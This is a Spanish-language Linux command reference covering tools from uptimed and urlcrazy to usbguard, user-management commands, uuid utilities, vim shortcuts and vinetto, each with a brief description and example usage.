Daemon de registro del tiempo de actividad del sistema con especial seguimiento de los tiempos de actividad más altos.
# service uptimed status (ver estado del demonio)
# uprecords (ver la tabla de registros)


urlcrazy
[ruby 1.8)]. http://www.morningstarsecurity.com/research/urlcrazy . Herramienta que genera posibles URLs de un dominio que podrian ser usados para ataques de phising, malversing o fraudes varios.
$ ./urlcrazy (Muestra las opciones)
$ ./urlcrazy -o paypal.txt paypal.com (Redirigiendo el resultado a un archivo)
Otras opciones:
-p (Mostrar URL parecidas más populares según google)
-r (No resolviendo los nombre de dominio)


urlview
Extraer las direcciones URL de archivos de texto.
$ urlview archivo.txt


urlwatch
Comprueba si una página web ha sufrido cambios desde la última vez que se lanzó la aplicación. Configurar las URLs, una por linea en el archivo:
$ mkdir .urlwatch
$ nano .urlwatch/urls.txt
	http://www.tuxapuntes.com
	http://crontux.homelinux.com/wiki
	http://systemadmin.es
$ urlwatch (Lanzar la aplicación)


usb-devices
[usbutils]. Script de shell que puede mostrar detalles de los buses USB en el sistema y los dispositivos conectados a ellos. El script está destinado principalmente para ser utilizado si el archivo /usb/devices no está disponible. A diferencia del archivo usb/devices este script solo muestra las interfaces activas (las marcadas con un "*" en el archivo usb/devices).
$ usb-devices


usbguard
Proteger el sistema contra dispositivos USB no autorizados [BadUSB].
# systemctl status usbguard (controlar el estado del servicio)
# usbguard list-devices (listar dispositivos USB conectados, si estan permitidos, bloqueados o rechazados y ver sus IDs)
# usbguard allow-device <ID_del_dispositivo> (permitir un dispositivo)
# usbguard block-device <ID_del_dispositivo> (bloquear un dispositivo)
# usbguard monitor (monitorizar en tiempo real los eventos de dispositivos USB)
# usbguard generate-policy > /ruta/a/politica.conf (generar archivo de configuración que puede reutilizarse en otros sistema)
Se pueden crear reglas para dispositivos USB en el archivo:
# nano /etc/usbguard/rules.conf
Con la linea:
    allow id 1d6b:0002 (para autorizar)
Y si se quere bloquear todo:
# nano /etc/usbguard/usbguard-daemon.conf
    PresentDevicePolicy=block
Para cambiar cómo se tratan los dispositivos USB ya conectados cuando el servicio USBGuard se inicia:
# nano /etc/usbguard/usbguard-daemon.conf
Y en las opciones en "PresentDevicePolicy":
    apply-policy: aplica las reglas existentes a los dispositivos ya conectados.
    allow: permite todos los dispositivos ya conectados.
    block: bloquea todos los dispositivos ya conectados.


usb_modeswitch
Configuración del modem Huawei. Editar:
# gedit /etc/usb_modeswitch.conf
	EnableLogging=0
Y pegar el siguiente contenido:
	# Huawei E1752
	#
	# Contributor:
	DefaultVendor=0x12d1
	DefaultProduct=0x1446
	TargetVendor=0x12d1
	TargetProduct=0x1417
	MessageEndpoint=0x01
	MessageContent="55534243000000000000000000000011060000000000000000000000000000"
Verificar que el número de TargetProduc coincida con la salida de:
# lsusb
	Bus 006 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 005 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 004 Device 002: ID 0461:4d03 Primax Electronics, Ltd Kensington Mouse-in-a-box
	Bus 004 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 003 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
	Bus 001 Device 006: ID 12d1:1417 Huawei Technologies Co., Ltd.
	Bus 001 Device 003: ID 0402:5602 ALi Corp. Video Camera Controller
	Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Arrancarlo con alguno de los siguientes comandos:
# usb_modeswitch -v 12d1 -p 1417 -d 1
# usb_modeswitch -c /etc/usb_modeswitch.conf


usbhid-dump
[usbutils]. Volcar descriptores de informe y flujos de interfaces HID de todos los dispositivos USB conectados.
$ usbhid-dump (básico)
$ usbhid-dump -m 5543:0005 -es (Volcar flujo de informes para un dispositivo con ID de proveedor 0x5543 e ID de producto 0x0005)
$ usbhid-dump -es (Volcar flujos de informes de todas las interfaces HID de todos los dispositivos USB [precaución: perderá el control sobre el terminal si usa un teclado USB])


usbmount
(+ autofs [demonio]). Automontar dispositivos de almacenamiento externo. Editar:
# nano /etc/usbmount/usbmount.conf
Y verificar/modificar según necesidades, las lineas:
MOUNTPOINTS="/media/usb0 /media/usb1 /media/usb2 /media/usb3 /media/usb4 /media/usb5 /media/usb6 /media/usb7"
FILESYSTEMS="vfat ext2 ext3 ext4 hfsplus"
MOUNTOPTIONS="sync,noexec,nodev,noatime,users,umask=000"


usbtop
Muestra un ancho de banda instantáneo estimado en dispositivos y buses USB.
Cargar módulo:
# modprobe usbmon
# usbtop (lanzar la aplicación)


usbutils
Paquete que contiene varias utilidades para inspeccionar los dispositivos conectados al bus USB. Incluye los comandos lsusb [ver], usb-devices [ver], usbhid-dump [ver] y usbreset.
Primero ha de lanzarse:
$ lsusb (para conocer el bus y el device)
  ...
  Bus 001 Device 006: ID 0930:652a Toshiba Corp. TravelDrive
  ...
$ usbreset 001/006 (con los datos anteriores [bbb/ddd], resetear un usb)
$ usbreset 0930:652a (lo mismo pero con los datos ID de la salida lsusb)


uscan
Se ejecuta sin argumentos desde la raíz del árbol de fuentes donde se ve el directorio debian/, o un directorio que contiene varios árboles de fuentes.
$ uscan


useradd
Crear usuarios.
# useradd -d /home/user -m user (Especifica la ruta a su $HOME)
Otras opciones:
-M usuario  (sin directorio $HOME)
-g users user (grupo principal al que pertenece el usuario)
-e 20111231 user (fecha de expiración de un usuario: 2011-12-31)
-G video,audio user (grupos adicionales a los que pertenece)
-s /bin/bash (especifica la shell del usuario)
-s /sbin/nologin (El usuario no podra logearse en el sistema. Ideal para usuarios con acceso a Samba o FTP sin acceso al interprete de comandos)
-u 503 (Identificador que sera asignado al usuario. Por defecto la UID será a partir del numero 500. Si no se especifica, automáticamente se establece el siguiente número disponible a partir del último usuario creado.)
Un ejemplo completo:
# useradd -d /home/paco -g users -s /bin/bash -m paco
1.-
/etc/default/useradd
Archivo donde se definen los valores [shell, directorio del directorio personal, ID del grupo, expiración de la contraseña...] por defecto para la creación de nuevos usuarios [ver useradd y skel]
Algunos parámetros:
	GROUP=100
	HOME=/home
	INACTIVE=-1
	EXPIRE=
	SHELL=/bin/sh
	SKEL=/etc/skel


userdel
Borrar usuarios
# userdel usuario (Elimina al usuario pero no su directorio personal)
# userdel -r usuario (lo borra junto a su directorio $HOME)
# userdel -f usuario (Borra al usuario y su directorio personal incluso aunque esté logeado en el sistema)


user-dirs.dirs
[archivo $HOME/.config/user-dirs.dirs] Archivo donde se especifican los directorios que saldran por defecto en el $HOME:
XDG_DESKTOP_DIR=”$HOME/Escritorio”
XDG_DOWNLOAD_DIR=”$HOME/Descargas”
XDG_TEMPLATES_DIR=”$HOME/Plantillas”
XDG_PUBLICSHARE_DIR=”$HOME/Público”
XDG_DOCUMENTS_DIR=”$HOME/Documentos”
XDG_MUSIC_DIR=”$HOME/Música”
XDG_PICTURES_DIR=”$HOME/Imágenes”
XDG_VIDEOS_DIR=”$HOME/Vídeos”


usermod
modifica propiedades de los usuarios [directorio base, el shell, grupos a los que pertenece, expiración, bloqueo/desbloqueo de la cuenta]
# usermod -G grupo1,grupo2 usuario (añade usuario a grupos)
# usermod -a -G video usuario  (incluye usuario al grupo video. )
# usermod -e 2009-12-10 user  (la cuenta de user expira el 20-12-09)vsftpd
# usermod -L usuario  (Bloquea a usuario)
# usermod -U usuario  (Desbloquea a usuario)
# usermod -u 999 usuario (baja el ID del usuario, normalmente 1000, para ocultarlo de la pantalla de login [gdm])
# usermod -s /sbin/nologin apache (Otorga al usuario apache una shell que no permite la ejecución de ningún comando)
# usermod -l juan pedro (Cambiar el nombre de usuario “pedro” a “juan”)
# usermod -d /home/nuevo -m usuario (modificar el nombre del directorio  home de un usuario)


userpath
Herramienta para agregar ubicaciones personalizadas a la RUTA del usuario.
# userpath append /var/www/html (se agrega la ubicación especificada a la ruta del usuario)
# userpath verify /var/www/html (comprobar si ha agregado)


users
Quien está conectado al sistema
$ users (ejecución básica)
$ users | xargs -n1 echo | sort | uniq -c  (número de sesiones abierta por los usuarios)


user-setup
Normalmente cuando se instala una distro, durante la instalación se crea un primer usuario. Si por alguna de las cosas poco probables, no se ha creado, con este paquete puede hacerse.
$ user-setup


util-linux
Paquete estándar distribuido por la Linux Kernel Organization que contiene varias utilidades importantes, la mayoría de las cuales están orientadas al mantenimiento del sistema. Incluye las siguientes aplicaciones: dmesg, findmnt, lsblk, more, mountpoint, su, wdctl, agetty, blkdiscard, blkid, blkzone, blockdev, chcpu, ctrlaltdel, findfs, fsck, fsck.cramfs, fsck.minix, fsfreeze, fstrim, getty, isosize, mkfs, mkfs.bfs, mkfs.cramfs, mkfs.minix, mkswap, pivot_root, runuser, sulogin, swaplabel, switch_root, wipefs, zramctl, addpart, choom, chrt, delpart, fallocate. flock, getopt, hardlink, i386, ionice, ipcmk, ipcrm, ipcs, last, lastb, linux32, linux64, lscpu, lsipc, lslocks, lslogins, lsmem, lsns, mcookie, mesg, namei, nsenter, partx, prlimit, rename.ul, resizepart, rev, setarch, setpriv, setsid, setterm, taskset. uclampset, unshare, utmpdump, whereis y x86_64


util-linux-extras
Herramientas que se encuentran comúnmente en sistemas donde se inicia sesión de forma interactiva o que son necesarias con configuraciones de sistema no estándar. Incluye las siguientes aplicaciones: fincore, lsfd, lsirq y hwclock.


util-linux-locales
Paquete que contiene los archivos de internacionalización para el paquete util-linux. Son necesarios cuando se desea que los programas de util-linux impriman sus mensajes en otros idiomas que no sean inglés.


utorrent
Descarga de torrents. Previamente crear los directorios de descargas:
$ mkdir rtorrent
$ mkdir rtorrent/descargas
$ mkdir rtorrent/sesion vsftpd
$ mkdir rtorrent/torrents
Los torrents se colocan en la carpeta rtorrent/torrents para que al abrir la aplicación los coja directo. Crear un archivo de configuración:
$ touch .rtorrent.rc
Editarlo y pegar las siguientes entradas:
$ nano .rtorrent.rc
# Session directory
session = /home/USER/rtorrent/sesion
directory = /home/USER/rtorrent/descargas
schedule = watch_directory,5,5,load_start=/home/USER/rtorrent/torrents/*.torrent
# Port range to use for listening.
port_range = 55556-55560
# Maximum number of simultanious uploads per torrent.
max_uploads = 5
# Global upload and download rate in KiB. "0" for unlimited.
#download_rate = 0
upload_rate = 50
# Maximum and minimum number of peers to connect to per torrent.
#min_peers = 40
max_peers = 80
# Same as above but for seeding completed torrents (-1 = same as downloading)
min_peers_seed = 10
max_peers_seed = 30
Algunos atajos:
	^ q (cierra la aplicación)
	Flechas arriba y abajo (Selecciona torrents)
	flecha derecha (Muestra información sobre el torrent seleccionado)
	^ s (Inicia la descarga el torrent seleccionado)
	^ d (para la descarga o, si está parada, suprime el torrent)


uuencode
[sharutils]. Algoritmo utilizado para convertir datos binarios de 8 bits a formato de 7 bits. La codificación uuencoding se creó originalmente para enviar archivos binarios mediante el protocolo de correo electrónico uucp. Si no se especifica salida se muestra por pantalla (/dev/stdout)
$ uuencode file1 file2 > file.uue ("file1": nombre del binario a codificar, "file2": Nombre que tendrá el binario una vez descodificado [puede ser el mismo que el binario original] y "file.uue" el nombre que se verá en el directorio.)
$ uudecode file.uue (Descodificar el binario. Se verá con el nombre puesto en "file2")


uuid
Los UUID son números de 128 bits que pretenden tener una alta probabilidad de unicidad en el espacio y el tiempo y son computacionalmente difíciles de adivinar. Son identificadores únicos a nivel mundial que pueden generarse localmente sin contactar a una autoridad de registro global. Los UUID están pensados como identificadores únicos tanto para el etiquetado masivo de objetos con una vida útil extremadamente corta como para la identificación confiable de objetos muy persistentes en una red.
$ uuid -m (Fuerza el uso de una dirección MAC de multidifusión aleatoria)
$ uuid -F STR (representación de cadena ASCII hexadecimal de 36 caracteres de un UUID)
$ uuid -F SIV (representación de un valor entero único de 39 caracteres de longitud máxima de un UUID)
$ uuid -v1 (generar uuid de la versión 1 de uuid)
$ uuid -d 8ce17124-a813-11ee-a715-8fccac721c4c (decodificar un UUID determinado)


uuidcdef
Genera un nuevo identificador uuid. [ver uuidgen]


uuidd
Demonio utilizado por la biblioteca UUID para generar identificadores únicos universales de una manera segura y única garantizada, incluso frente a un gran número de subprocesos que se ejecutan en diferentes CPUs.
$ uuidd -p /tmp/uuidd.pid -s /tmp/uuidd.socket (Especificando ruta donde escribir el archivo pid y no creando un socket, sino esperando que lo proporcione el proceso)
$ uuidd -d -r -n 42 -s /tmp/uuidd.socket (Ejecutar uuidd en modo de depuración, intentando conectarse a un demonio uuidd en ejecución y solicitarle que devuelva un UUID aleatorio, al emitir una solicitud de prueba a un uuidd en ejecución, solicitar una respuesta masiva de UUID numéricos y no creando un socket sino esperando que lo proporcione el proceso)
$ uuidd -d -k -s /tmp/uuidd.socket (modo depuración, eliminar el daemon si se está ejecutando y esperando a que lo proporcione el proceso)


uuidgen
[uuid-runtime]. Crear nuevo valor uuid
$ uuidgen -r (Aleatorio)
$ uuidgen -t (Crea un UUID basado en el reloj del sistema)


uuidparse
Utilidad para analizar identificadores únicos UUID.
$ uuiparse -J UUID (Utilizar el formato de salida JSON)
$ uuiparse -r UUID (Utilizar el formato de salida raw)


uz
extrae un archivo tar comprimido con gzip. No es estrictamente necesario porque el programa tar [ver] proporciona la misma capacidad.
$ uz archivo.tar


uzbl-browser
[uzbl-tabbed)]. Navegador estilo vi. Arrancarlo con uzbl-tabbed para permitir pestañas.
$ nano .config/uzbl/config (archivos de configuración)
Atajos:
	j (descendeer en la página)
	k (subir en la página)
	h (ir a la izquierda de la página)
	l (ir a la derecha de la página)
	<< (ir al final de la página)
	>> (ir al principio de la página)
	o (abrir guión para entrar una url)
	gg (abrir guión para entrar una busqueda en google)
	gh (página de inicio)
	gn (abrir nueva pestaña en blanco)
	go (abrir dirección en una nueva pestaña)
	gt (ir a la siguiente pestaña)
	gT (ir a la pestaña anterior)
	gi+2 (ir a la pestaña 2)
	w (abrir nueva ventana)
	b (volver a la página anterior)
	u (favoritos)
	U (historial)
	Esc (anular)
	S (stop)
	ZZ (Cerrar pestaña /cerrar ventaña / salir de uzbl)
	r (actualizar página)
	R (actualizar página desde la caché)
	/ (Guión para entrar una busqueda en la página)
	n (ir a la busqueda siguiente)
	N (ir a la busqueda anterior)


validlocale
Comprobar si una configuración regional determinada está disponible.
          $ validlocale ca_ES.UTF-8
          locale 'ca_ES.UTF-8' valid and available


variables
Existen dos tipos de variables:
Variables locales (tiene valor únicamente dentro de nuestra shell)
Variables globales (disponibles para todos los procesos invocados por la shell)
Al ejecutar un script la línea de comandos introducida se guarda en unas variables especiales que podemos referenciar:
$0 (Nombre del comando)
$1 (Primer argumento)
$2 (Segundo...)
$@ (Todos los argumentos introducidos, separados por espacios)
$# (Número de argumentos)
$$ (identificador del proceso)
$? (Cuando finaliza la ejecución de un proceso, $? será cero (0) si se ejecuta correctamente y distinto de cero si se ha producido algún error. Es muy usual guardar su valor en una variable (VAR=$?) para su posterior uso.)
Para declarar una variable sólo se precisa asignarle un valor. Nunca el valor puede preceder a la variable. No se ponen espacios ni antes ni después del signo igual. El nombre puede contener caracteres alfabéticos (A-Z, a-z), numéricos (0-9) o el guión bajo ‘_’. El primer carácter no puede ser un número o contener otros signos (2DIR, .DIR, -VAR...)
	DIR="/var/www"
También puede asignarse a partir del contenido de un fichero:
	$ firma=$(<firma.txt)
Puede asignarse a la salida de un comando encerrado entrecomillas graves:
	WHO=`who | awk '{print$2}'`
O entra parentesis antecedido por el signo dolars ($):
	WHO=$(who | awk '{print$2}')
Variables introducidas por el teclado:
	echo "Como te llamas"
	read NOMBRE
Puede especificarse un tiempo (en segundos) de espera para entrar lo solicitado (-t):
	read -t 10 -p "¿Nombre y apellido? " NOMBRE APELLIDO
Para definir variables numéricas se utiliza el comando let:
	let A=100
	let B=200
	let C=$A+$B
Si al llamar a una variable, esta va seguida de un carácter que sea otra letra, numero o el guión normal o bajo, La encerraremos entre llaves '{}':
	ARCHIVO="registro"
	echo "${ARCHIVO}_2011.txt"
	registro_2011.txt
Cuando bash encuentra en una palabra el signo "$" todo lo que va a continuación se considera el nombre de una variable y todos los caracteres desde el "$" hasta el final de la palabra son sustituidos por dicha variable:
	COSA="camastro"
	echo "ca$COSA"
	camastro
Otra forma de entrar variables es mostrando un promt:
	$ read -p "palabra> " PALABRA
Si no indicamos nombre de variable, lo ingresado se guarda en la variable REPLY:
	read
	juan jose pedro
	$ echo $REPLY
	juan jose pedro
Modificar parte de una variable:
	a="Linux es un sistema genial"
	echo ${a/geni/brut}
	Linux es un sistema brutal
Algunas de la variables globales:
	$HOME  (ruta del directorio home del usuario)
	$PATH    (directorios donde se encuentran los ejecutables)
	$TERM    (nombre de la terminal)
	$BASH    (ruta del interprete bash )
	$PWD      (directorio actual)
	$USER     (Usuario)
	$HOSTNAME  (Nombre del equipo)
	$HISTFILE (ruta para el histórico de comandos ejecutados)
	$UID     (Número de usuario para el sistema)
	$RANDOM (números aleatorios entre 0 y 32767)


vbetool
Herramienta para apagar y encender la pantalla de un portatil (backlight)
# vbetool dpms off (Apaga la pantalla)
# vbetool dpms on (Enciende la pantalla)


vdir
Equivalente a ls -l.


verse
Muestra un verso de la Biblia en cada inicio de sesión. Cada día se asigna un versículo de la versión King James de la Biblia [en inglés].


vfu
Gestor de archivos. Configuración en /home/USUARIO/.vfu/vfu.conf
$ vfu -d /usr/local -i (Especificando directorio y de forma interactiva)
$ vfu (Abre el presente directorio)
Algunos atajos:
	c (Copiar)
	Enter (entrar en un directorio o abrir documento)
	e (Eliminar)
	g (Seleccionar/deseleccionar todo)
	i (Editar archivo. Por defecto usa joe. Modificar en el archivo de configuración)
	h (Muestra las teclas de ayuda)
	n (Buscar)
	Flecha derecha (Renombrar)
	q (Salir)


vglconnect
Crear conexión para el uso de VirtualGL entre la maquina cliente y la remota (la que ejecutará las aplicaciones OpenGL). Funciona como una conexión SSH pero con la redirección de aplicaciones gráficas activada.
$ vglconnect usuaro@1.2.3.4


vglrun
Ejecuta aplicaciones utilizando las librerias de VirtualGL
$ vglrun programa
$ vglrun -q 70 programa (Baja la calidad de los JPG enviados entre la máquina remota y la local)


video
1.- Descargar video flash:
Iniciar la reproducción del vídeo.
$ lsof |grep Flash
chromium- 15931 lb 25u REG 8,2 2422656 656146 /tmp/FlashXXYX9waY (deleted)
Los datos que interesan son: 15931 y 25. Sin cerrar la página del vídeo y una vez finalizada su carga copiarlo:
$ cp /proc/15931/fd/25 video.flv


videoob
[webood (ver)]. Visualización y descarga de videos. Para activar nuevos módulos (youtube, vimeo...) ver weboob.
$ videoob (Entrar en el prompt)
videoob> search porn (Buscar videos ralacionados con "porn")
videoob> info 3 (Información sobre el marcado con el número 3 en el listado anterior)
videoob> play 3 (Reproduce el número 3)
videoob> download 3 (Descarga el número 3 en el directorio actual)
videoob> quit (Salir del prompt)
videoob> download 3 video.mp4 (Descarga el número 3 en el directorio actual renombrandolo video.mp4)


videotop
[videotop-git, urwid, youtube-dl]. Descarga de videos de youtube.
$ videotop  (Para entrar en el prompt)
Teclear:
	:s queen (se mostrarán los videos en los que aparezca queen. Se selecciona con la flechas el que se quiera descargar y se pulsa intro. El video se encontrará en $HOME/.videotop/videos/)
	:5 (Descargar el video 5)
	:v (Muestra los videos descargados [ls $HOME/.videotop/videos])
	:q (salir)
	:delete (borrar video seleccionado)
	:clear (limpia la busqueda y se entra en modo buscador.)
		^r (limpia el listado)
		^n (continuación de la misma busqueda)


videotrans
Colección de utilidades diseñadas para ayudar en la creación de DVDs. Los programas que integran la herramienta son: movie-compare-dvd, movie-fakewavspeed, movie-make-title, movie-make-title-simple, movie-progress, movie-rip-epg.data, movie-title, movie-to-dvd y movie-zoomcalc.


vidir
[moreutils]
Edita como un archivo de texto directorios o archivos.
$ vidir /home/usuario
$ vidir *.png


view
Ver en pantalla el contenido de un archivo.
$ view fichero.txt


viewres
Muestra el árbol con la jerarquía de clases de widgets de Athena Widget Set.
$ viewres -name shell
$ viewres -variable
$ viewres -vertical


vifm
Plugin de Vim que permite el uso de un selector de archivos en el propio Vim. Descarga: https://github.com/vifm


vigpg
Programa que envuelve al editor cuando se editan archivos encriptados como puede ser el archivo de contraseñas .gpg.
3 vigpg archivo.txt.gpg


vigr
Editor que permite modificar el fichero /etc/group en modo seguro. La diferencia de editarlo con vigr o hacerlo con cualquier otro editor (gedit, nano...) es que vigr bloquea el fichero para evitar ediciones simultaneas y en el momento de guardar los cambios realiza un chequeo del fichero en busca de fallos de sintaxis.
# vigr (Editar el fichero /etc/group)
# vigr -s (Editar el fichero /etc/gshadow)


vilistextum
Convertir textos html a ascii
$ vilistextum -m -n archivo.html archivo.txt (sin mostrar caracteres estraños ni imagenes)


vim
Editor
$ vim fichero (Abrir un fichero)
$ vim -x fichero (Poner contraseña a un fichero)
$ vimtutor (Lanzar un tutorial elemental de vim)
Algunas teclas para no morir en el intento:
modo:
	i (Entrar en modo edición)
	esc (Salir modo edición y entrar en modo comando)
Salvavidas
	u (Cada pulsación deshace el siguiente cambio del historial)
Movimientos del cursor:
	k (Arriba)
	j (Abajo)
	h (Derecha)
	l (Izquierda)
	w (Ir al principio de la palabra posterior)
	b (Ir al principio de la palabra anterior)
	$ (Ir al final de la linea)
	0 (Ir al principio de la linea)
	) (Ir a la frase siguiente)
	( (Ir a la frase anterior)
	{ (Pasar al siguiente párrafo)
	} (Pasar al anterior párrafo)
	H (Ir a la parte superior de la pantalla)
	M (Ir a la parte media de la pantalla)
	L (Ir a la parte inferior de la pantalla)
	Crtl + d (Avanzar media pantalla)
	Crtl + u (Retroceder media pantalla)
	gg (Ir al principio del ficherol)
	G (Ir al final del fichero)
	:20 (Ir a la linea 20)
Borrar:
	daw (palabra)
	d3aw (3 palabras)
	dd (Linea)
	3dd (3 lineas)
	d$ (Del cursor al final de la linea)
	d0 (Del cursor al principio de la linea)
Copiar, pegar e insertar:
	yy (copiar línea)
	p (pegar debajo del cursor)
	yaw (copiar toda la palabra)
	yap (Cortar todo  el párrafo)
	:r archivo (insertar "archivo")
	:r! comando (insertar salida de comando)
	o (Insertar linea en blanco y entrar en edición)
Búsqueda:
	/palabra (buscar hacia adelante "palabra")
	/palabra\c (buscar "palabra" sin importar mayúsculas o minúsculas)
	n (Siguiente coincidencia hacia delante)
	N (Siguiente coincidencia hacia atras
	:%s/texto1/texto2/g (Substituir "texto1" por "texto2" en todo el archivo)
Abrir, guardar y salir
	:q! (Salir sin guardar)
	:w (Guardar cambios sin salir)
	:x (Guardar cambios y salir)
	:w fichero (Guardar en un fichero distinto y seguir)
	:e fichero2 (Cierra el fichero actual y abre fichero2)
	:e . (Abre un navegador de ficheros del directorio actual)
	:e (Recarga el fichero)
	ZZ (Guardar y salir)
	:w !sudo tee % (Guardar un archivo tras haberlo abierto sin “sudo”)
Modo visual:
	v (Entra en modo visual para seleccionar texto)
	c (Cortar)
	y (Copiar)
	p (Pegar)
	"add (Cortar linea y guardarla con el nombre "a")
	"ap (Pegar la linea guardada como "a")
	"+3dd (Cortar 3 lineas y guardarlas en el portapapeles)
	"+p (Pegar las lineas guardadas en el portapapeles)
Dejar marcas en un texto:)
	ma (Marca una linea con la "a". las siguientes: mb, mc, md..)
	'a (Ir a la linea marcada con la "a")
	'. (Ir a la última linea modificada)
Ejecución de comandos durante la edición:
	:!ls (Muestra listado del directorio y con intro regresa al editor)
	:shell (Pausa la edición y entra en modo shell. Con "exit" vuelve a vim)
	Ctrl z (Suspende vim y entra en la shell. Con "fg" vuelve a vim)
Crear pestañas:
	:tabnew fichero (Abrir un archivo en una nueva pestaña)
	gt (Moverse entre pestañas)
	:close (Cierra la ventana o la subdivision de la ventana)
	:only (Cierra todas las ventanas menos la actual)
Dividir la pantalla en distintos paneles:
	:split fichero (Abrir un archivo en una division horizontal de la ventana)
	:vsplit fichero (Abrir un archivo en una division vertical de la ventana)
	:new (Abre un nuevo panel vacio)
	:close (Cerrar panel o ventana)
	Ctrl + w flecha (Moverse entre los distintos paneles de una ventana)
	Ctrl + w n (crear nueva ventana)
	Ctrl + w h (ir a la ventana de la izquierda)
	Ctrl + w j (ir a la ventana de abajo)
	Ctrl + w k (ir a la ventana de arriba)
	Ctrl + w l (ir a la ventana de la derecha)
	Ctrl + w t (ir a la ventana de más arriba)
	Ctrl + w b (ir a la ventana de más abajo)
	Ctrl + w w (pasar a la siguiente ventana)
	Ctrl + w + (aumentar el tamaño de la ventana en 1 linea)
	Ctrl + w - (disminuir el tamaño de la ventana en 1 linea)
Imprimir:
	:ha (Imprimir todo el documento)
	:ha > archivo.pdf (Imprimir a pdf)
Guardar sesiones:
	:mksession! archivo (Guarda la sesión actual en "archivo")
	:source archivo (Una vez abierto el archivo, carga la sesión guardada)
Corrector ortográfico:
	:set spell spelllang=es (Activar diccionario. spelllang=ca para catalan)
	z= (Con el cursor en el error, muestra las sugerencias)
	Ctrl + x s (Abre el menú de sugerencias sin salir del modo insertar)
	:spellrepall (Corrige en todo el texto la que acabamos de corregir
	zg (Añadir al corrector la palabra del cursor)
	zw (Surpimir del corrector la palabra del cursor)
Buffers:
	:buffers (Muestra buffers abiertos (actual [%], cerrado [#], activo [a], oculto [h])
	:buffer 2 (salta al buffer 2)
	:bn (Ir al siguiente buffer)
	:bp (Ir al anterior)
	:bd (suprimir buffer [Cerrar archivo])
	:ls (Lista los buffers)
Varios:
	:e /home/usuario (Abre vim en modo navegador de archivos con el directorio mencionado)
	:Ex (Abre el navegador de archivos en un nuevo panel de la ventana activa)
algunos ajustes que pueden implementarse, bien durante la edición [en modo normal] o
permanentemente en ~/.vimrc [en este caso quitar los dos puntos iniciales]:
	:set showmode/noshowmode (mostrar/no mostrar modo actual de vi)
	:set ts=4 (Fija los tabulados a 4 espacios)
	:set sw=4 (Fija los indentados a 4 espacios)
	:set number/nonumber (Activa/desactiva el numerado de lineas)
	:set backup/nobackup (Activa/desactiva la copia de seguridad automática)
	:set directory=dir (fija la carpeta donde se harán las copias)
	:syntax on/off (Activa/desactiva el resaltado de sintaxis)
	:set hidden (Información sobre la columna y posición del cursor)
	:set ignorecase (Ignorar mayúsculas y minúsculas en las busquedas)
	:set showcmd (Mostrar la combinación de teclas que estamos entrando)
	:set nocompatible (Permite usar funcionalidades de vim que vi no soporta)
	:set hidden (Permite abandonar buffers sin guardarlos previamente)
	:color darkblue (Cambia el color del vim [evening, desert, elflord, koehler, morning..])
	:set cindent (Activa indentado automático)
	:set history=500 (Aumentar el historial de comandos a 500)
	:set undolevels=1000 (Aumentar pasos a deshacer a 1000)
	:set mouse=a/mouse= (Activa/desactiva el uso del ratón)
	:set paste/nopaste (Activa/desactiva el modo pegar texto literalmente)
	:spell (Activa el corrector ortográfico)
	:set spellfile=~/.vimdic  (Fija diccionario de palabras desconocidas)
	:set ruler (mostrar fila y columna del cursor y porcentaje del texto)
	:set ignorecase (Que ignore mayúsculas y minúsculas en las busquedas)
	:set linebreak (Para que las palabras no se corten al final de la linea)
	:set encoding=utf-8  (Codificación que se usará [utf-8])
	:set list (Mostrar los caracteres no imprimibles)
	:set wrap (Activa el cortado de líneas largas en pantalla)
	:set t_Co=256 (La terminal con 256 colores)
1.-
Poner un esquema de colores:
$ mkdir -p ~/.vim/colors (Crear el directorio caso de no existir)
Entrar en <http://www.vim.org/scripts/script_search_results.php> y escoger los deseados y copiarlos en el directorio creado. Despues crear [si no existe] el fichero:
$ vim .vimrc
Y pegar el texto:
	syntax on
	colorscheme oceandeep
En colorscheme poner el escogido, en este caso oceandeep. Guardar.
2.-
Crear atajos de teclado [mapping]. Colocar en ~/.vimrc para hacerlo permanente:
Pulsar F2 para mostrar/ocultar los números de línea:
	:map <F2> <Esc>:set invnumber<CR>
Pulsar F3 para mostrar/ocultar los caracteres no imprimibles:
	map <F3> <Esc>:set invlist listchars=eol:$,tab:>-,trail:-<CR>
Pulsar F4 para activar el corrector ortográfico:
	map <F4> <Esc>:set spell spelllang=es<CR>
Nombre de las teclas especiales para el mapeo:
	<up>		Flecha arriba				<down>		Flecha abajo
	<right>		Flecha derecha				<left>		Flecha izquierda
	<esc>		Escape						<cr>		Enter
	<space>		Espacio						<tab>		Tabulador
	<del>		Suprimir					<bs>		Backspace
	<f1>..<f12>	Teclas de función			<insert>	Insert
	<end>		Fin							<c-tecla>	Control + tecla
	<RePag>		Página anterior				<AvPag>		Página siguiente
	<s-tecla>	Shift + tecla				<c-s-tecla>	Control + shift + tecla
3.-
Copiar y pegar texto de vim a las X y viceversa:
Comprobar si vim tiene soporte para xterm_clipboard lanzando vim y ejecutando:
	:version
Las opciones precedidas con "+" estan habilitadas y las con "-" deshabilitadas. La solución, si está deshabilitada, es compilar vim con dicha opción o instalar vim-gtk o gvim (según distro). El proceso en vim es seleccionar el texto a copiar y:
	"+y
Y pegar en cualquier editor (gedit, pico...) con Ctrl + v o con el botón derecho del mouse. El proceso inverso, o sea copiar en otro editor y pegar en vim será seleccionando y copiando el texto con el mouse y pegarlo en vim con:
	"+p
Nota- Para que todo lo copiado en Vim se asigne automáticamente al portapapeles del sistema operativo, añadir a .vimrc:
	set clipboard=unnamedplus
4.-
Abrir un panel lateral con el arbol de directorios [Plugin NERDTree]
	$ git clone https://github.com/scrooloose/nerdtree.git
	$ cd nerdtree/
	$ cp -R * ~/.vim/
Para abrir NERDTree pulsando F5 colocar en .vimrc la linea:
	map <F5> :NERDTreeToggle<cr>


vimdff
Editar dos, tres o cuatro versiones de un archivo con Vim y mostrar sus diferencias.
$ vimdff file1 file2 (comparar dos archivos linea a linea con vim. De forma predeterminada, vimdiff divide la pantalla verticalmente)
$ vimdff -o file1 file2 (división de pantalla horizontal)


vimtutor
Tutorial de vim. Se encuentra en /usr/share/vim/vim90/tutor/ en varios idiomas
$ vimtutor -g es (Mostrar el español. Recordar que para salir del tuto :qa)


vinetto
Programa para extraer imágenes en miniatura y sus metadatos de los archivos Thumbs.db que se generan en Microsoft Windows.
